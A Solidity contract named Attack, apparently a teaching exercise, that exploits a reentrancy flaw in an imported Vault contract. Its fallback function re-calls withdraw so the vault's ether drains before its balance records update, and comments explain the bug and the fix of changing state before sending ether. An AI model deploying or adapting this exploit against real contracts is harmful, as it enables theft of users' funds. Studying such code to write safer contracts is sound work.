pragma solidity 0.6.0;

import "./Vault.sol";

contract Attack {

    //Instanciate the vault contract
    Vault public vault;

    //Set the smart contract Adress that have been deployed with Vault contract
    constructor(address _vaultAddress) public {
        vault = Vault(_vaultAddress);
    }
    //The fallback is going to drain the funds because  the withdraw are doing
    // the transaction without changing the value of credit first, to prevent this you need
    // to ensure that all logic that changes state variables happens before ether is sent out of the contract
    fallback () external payable{
        //If vault has more than 1 ether, should collect 1 ether
        if(address(vault).balance >= 1 ether)
        {
            vault.withdraw(1 ether);
        }
    }
    //Attack function
    function attack() public payable
    {   
        require(msg.value >= 1 ether); //Validate if the attacker deposit have the ether to attack
        vault.deposit.value(1 ether)(msg.sender);
        vault.withdraw(1 ether);
    }

    function getBalance() public view returns(uint)
    {
        return address(this).balance;
    }
}